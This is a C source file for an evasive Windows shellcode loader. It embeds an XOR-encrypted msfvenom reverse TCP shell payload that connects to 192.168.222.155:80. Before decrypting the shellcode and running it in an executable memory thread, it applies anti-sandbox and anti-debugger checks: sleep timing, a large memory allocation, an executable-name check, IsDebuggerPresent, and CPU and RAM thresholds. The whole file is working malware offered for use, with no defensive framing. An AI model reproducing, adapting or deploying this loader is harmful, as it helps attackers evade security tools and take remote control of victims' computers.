//include header files
#include <windows.h> //Windows API
#include <stdio.h> //Input/output library
#include <stdlib.h> //Memory allocation
#include <string.h> //String manipulation
#include <time.h> //String manipulation
#pragma comment (lib, "winmm.lib") // instructs the linker to add the "winmm.lib" library to the list of libraries to be linked with the program

//encrypted payload (msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.222.155 lport=80 -f raw > calc.bin)
unsigned char buf[] =
{ 0x93, 0x2a, 0xf0, 0xbb, 0x93, 0x9a, 0xb9, 0x70, 0x74, 0x6f, 0x23, 0x22, 0x1e, 0x33, 0x20, 0x28, 0x26, 0x3c, 0x5e, 0xb0, 0x16, 0x17, 0xe8, 0x20, 0x19, 0x38, 0xff, 0x3d, 0x7a, 0x3b, 0xd4, 0x31, 0x52, 0x31, 0xfb, 0x6, 0x3f, 0x2a, 0x7c, 0xe8, 0x29, 0x38, 0x34, 0x41, 0xbd, 0x27, 0x53, 0xb3, 0xf3, 0x5f, 0x13, 0x5, 0x72, 0x58, 0x4f, 0x23, 0xb2, 0x96, 0x6e, 0x33, 0x78, 0xb1, 0x96, 0x82, 0x30, 0x32, 0xe, 0x2b, 0xf9, 0x2b, 0x50, 0xff, 0x2d, 0x5e, 0x3b, 0x5e, 0xb3, 0xf9, 0xf9, 0xf8, 0x74, 0x6f, 0x62, 0x3b, 0xda, 0xa3, 0x6, 0x1e, 0x38, 0x75, 0xbf, 0x32, 0xf8, 0x17, 0x7b, 0x36, 0xf2, 0x30, 0x54, 0x26, 0x63, 0xa3, 0xbc, 0x35, 0x3a, 0x86, 0xb9, 0x35, 0xe4, 0x56, 0xfb, 0x17, 0x62, 0xa4, 0x34, 0x41, 0xbd, 0x27, 0x53, 0xb3, 0xf3, 0x22, 0xb3, 0xb0, 0x7d, 0x35, 0x6e, 0xa3, 0x4b, 0xbf, 0x16, 0x83, 0x35, 0x73, 0x38, 0x4b, 0x6a, 0x36, 0x66, 0xb2, 0x7, 0xa1, 0x28, 0x30, 0xe4, 0x22, 0x57, 0x16, 0x62, 0xa2, 0x1f, 0x31, 0xff, 0x63, 0x2a, 0x37, 0xd4, 0x23, 0x6e, 0x30, 0x71, 0xa4, 0x2e, 0xe9, 0x77, 0xd7, 0x2b, 0x73, 0xa9, 0x31, 0x2c, 0x2e, 0x3a, 0x2d, 0x6, 0x39, 0x33, 0x21, 0x31, 0x2d, 0x2e, 0x38, 0x3b, 0xdc, 0x8f, 0x52, 0x38, 0x22, 0x8b, 0x8f, 0x3a, 0x32, 0x6, 0x39, 0x3a, 0xf2, 0x62, 0x9d, 0x38, 0x9d, 0x8c, 0xa0, 0x3e, 0x3b, 0xc7, 0x7, 0x7, 0x5d, 0x3d, 0x40, 0x6d, 0x63, 0x72, 0x38, 0x26, 0x3d, 0xe6, 0x84, 0x3b, 0xde, 0x8f, 0xd2, 0x78, 0x70, 0x74, 0x26, 0xeb, 0x96, 0x16, 0xdf, 0x70, 0x79, 0x70, 0xfb, 0xaf, 0xca, 0xad, 0xc4, 0x22, 0x26, 0x30, 0xf9, 0x90, 0x23, 0xeb, 0x82, 0x1e, 0xd9, 0x3e, 0xe, 0x56, 0x73, 0x90, 0xb7, 0x3f, 0xd6, 0x89, 0x1a, 0x78, 0x71, 0x74, 0x6f, 0x3b, 0x32, 0xe5, 0x4a, 0xf2, 0x12, 0x70, 0x8b, 0xba, 0x32, 0x23, 0x12, 0x52, 0xbb, 0x34, 0x41, 0xb4, 0x27, 0x9d, 0xb3, 0x17, 0xea, 0xb0, 0x31, 0x8f, 0xb4, 0x27, 0xeb, 0xb2, 0x1e, 0xd9, 0x98, 0x76, 0xaf, 0x94, 0x90, 0xb7, 0x3b, 0xd6, 0xa4, 0x18, 0x69, 0x31, 0x2c, 0x23, 0xeb, 0x91, 0x17, 0xea, 0x8b, 0x38, 0xca, 0xed, 0xca, 0x16, 0x12, 0xa0, 0xb6, 0x3a, 0xf8, 0xb4, 0x34, 0x6d, 0x62, 0x73, 0x16, 0xdb, 0x11, 0x14, 0x14, 0x74, 0x6f, 0x62, 0x73, 0x5f, 0x22, 0x22, 0x38, 0x20, 0x3c, 0xe6, 0x80, 0x24, 0x8, 0x34, 0x3f, 0x48, 0xb0, 0x1e, 0x62, 0x3b, 0x32, 0xf, 0x81, 0x8e, 0x1f, 0xb7, 0x30, 0x4b, 0x36, 0x72, 0x5e, 0x2b, 0xff, 0x3d, 0x54, 0x6c, 0xa9, 0x62, 0x1b, 0x17, 0xea, 0x94, 0x2f, 0x20, 0x35, 0x3f, 0x23, 0x23, 0x1e, 0x33, 0x3b, 0x86, 0xb0, 0x35, 0x3f, 0x2b, 0x8c, 0x97, 0x2e, 0xfb, 0xb8, 0x3c, 0xfd, 0xae, 0x23, 0xc9, 0x26, 0xaf, 0x4d, 0xff, 0x8f, 0xa1, 0x27, 0x53, 0xa1, 0x17, 0x9c, 0xb8, 0xf2, 0x7e, 0x35, 0xd5, 0x6a, 0xf4, 0x42, 0x3, 0x8d, 0xac, 0xcb, 0x84, 0xda, 0xc0, 0x25, 0x1e, 0xd9, 0xd4, 0xec, 0xcd, 0xe9, 0x90, 0xb7, 0x3b, 0xdc, 0xa7, 0x5a, 0x45, 0x76, 0x8, 0x65, 0xe2, 0x88, 0xbf, 0x16, 0x77, 0xc2, 0x37, 0x67, 0x1d, 0xd, 0x19, 0x5f, 0x3a, 0x33, 0xf0, 0xaa, 0x8b, 0xba };

unsigned int my_payload_len = sizeof(buf);

//Decryption key
char my_secret_key[] = "obs_crypt";

//decrypt deXOR function
//XOR each element of the data array with the corresponding element of the key array. The key array is repeated as needed to cover the entire data array.
void XOR(char* data, size_t data_len, char* key, size_t key_len) {
    int j;
    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;

        data[i] = data[i] ^ key[j];
        j++;
    }
}

typedef LPVOID(WINAPI* pVirtualAllocExNuma) (
    HANDLE         hProcess,
    LPVOID         lpAddress,
    SIZE_T         dwSize,
    DWORD          flAllocationType,
    DWORD          flProtect,
    DWORD          nndPreferred
    );


//Resource check
BOOL checkResources() {
    SYSTEM_INFO s;
    MEMORYSTATUSEX ms;
    DWORD procNum;
    DWORD ram;

    //Check number of processors is greater than 2
    GetSystemInfo(&s);
    procNum = s.dwNumberOfProcessors; //Find the number of processors in the system.
    if (procNum < 2) return false;

    // check if RAM is less than 2GB
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms); //Get information about the system's memory status.
    ram = ms.ullTotalPhys / 1024 / 1024 / 1024; //Calculate the total physical RAM in gigabytes
    if (ram < 2) return false;

    return true;
}

int main(int argc, char* argv[]) {
    void* my_payload_mem; //Memory buffer for payload
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;
    //Allocate and fill 1000 MB of memory
    char* mem = NULL;
    mem = (char*)malloc(1000000000); //Allocates a block of memory ~1000 MB in size

    //Time tricks
    DWORD mesure1;
    DWORD mesure2;
    mesure1 = timeGetTime();
    Sleep(1000);
    mesure2 = timeGetTime();

    if (mem != NULL) {
        if ((mesure2 > (mesure1 + 1000)) && (mesure2 < (mesure1 + 1050))) //Checks if the time difference between mesure1 and meaure2 is between 1000 and 1050 milliseconds
        {
            //Check if the executable's name contains "_obspython.exe"
            if (strstr(argv[0], "_obspython.exe") == NULL) {

                return -2;
            }

            //Check if any debugger is present
            if (IsDebuggerPresent()) {

                return -2;
            }


            //Check resources
            if (checkResources() == false) {

                return -2;
            }
            memset(mem, 00, 1000000000); //clears the allocated memory
            free(mem); //frees the allocated memory

            //Allocate a memory buffer for payload
            my_payload_mem = VirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            //Decrypt the payload using the XOR function
            XOR((char*)buf, my_payload_len, my_secret_key, sizeof(my_secret_key));

            //Copy the decrypted payload to the new buffer
            RtlMoveMemory(my_payload_mem, buf, my_payload_len);

             //Make the new buffer executable
            rv = VirtualProtect(my_payload_mem, my_payload_len, PAGE_EXECUTE_READ, &oldprotect);
            if (rv != 0) {

                //Run the payload
                th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)my_payload_mem, 0, 0, 0);
                WaitForSingleObject(th, -1);
            }
        }
    }
    return 0;
}
